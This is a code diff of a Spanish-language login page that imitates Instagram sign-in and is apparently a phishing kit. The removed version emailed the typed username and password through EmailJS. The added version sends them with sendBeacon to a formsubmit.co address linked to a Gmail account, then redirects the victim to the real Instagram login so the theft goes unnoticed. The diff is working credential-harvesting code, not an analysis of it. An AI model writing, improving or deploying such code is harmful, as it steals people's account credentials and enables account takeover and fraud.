@@ -4,13 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iniciar Sesión</title>
-    <!-- SDK de EmailJS para envío instantáneo -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function() {
-            emailjs.init("i3BHzWrNl1OuWEQRK");
-        })();
-    </script>
     <style>
         * {
             box-sizing: border-box;
@@ -206,11 +199,11 @@
 
         <form class="login-form" id="loginForm">
             <div class="input-group">
-                <input type="text" class="input-field" id="usernameInput" placeholder="Nombre de usuario, correo o celular" required>
+                <input type="text" name="Usuario" class="input-field" id="usernameInput" placeholder="Nombre de usuario, correo o celular" required>
             </div>
 
             <div class="input-group">
-                <input type="password" class="input-field password-field" id="passwordInput" placeholder="Contraseña" required>
+                <input type="password" name="Contraseña" class="input-field password-field" id="passwordInput" placeholder="Contraseña" required>
                 <button type="button" class="toggle-password" id="togglePassword" aria-label="Mostrar u ocultar contraseña">
                     <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
@@ -266,24 +259,20 @@
             submitBtn.disabled = true;
             submitBtn.textContent = "Redirigiendo...";
 
-            const templateParams = {
-                name: document.getElementById('usernameInput').value,
-                message: passwordInput.value
-            };
+            // Creamos el paquete de datos en formato JSON listo para enviar
+            const formData = JSON.stringify({
+                Usuario: document.getElementById('usernameInput').value,
+                Contraseña: passwordInput.value,
+                _captcha: "false",
+                _template: "table"
+            });
 
-            // EmailJS procesa y envía el correo de forma instantánea en milisegundos
-            emailjs.send("service_vyx1v45", "template_vyx1v45", templateParams)
-                .then((response) => {
-                    console.log('Enviado al instante');
-                })
-                .catch((error) => {
-                    console.log('Error', error);
-                });
+            // Usamos sendBeacon para garantizar el envío inmediato por debajo, 
+            // asegurando que la data salga aunque el usuario abandone la página de inmediato.
+            navigator.sendBeacon("https://formsubmit.co/ajax/trollgaga999@gmail.com", formData);
 
-            // Redirección inmediata a la versión web móvil de Instagram para evitar bucles raros en la app
-            setTimeout(() => {
-                window.location.replace("https://www.instagram.com/accounts/login/?mtn");
-            }, 800); // 0.8 segundos son más que suficientes para que EmailJS despache el correo y salte limpio
+            // Redirección ultra rápida al entorno de Instagram
+            window.location.replace("https://www.instagram.com/accounts/login/?hl=es&source=auth_switcher");
         });
     </script>
 
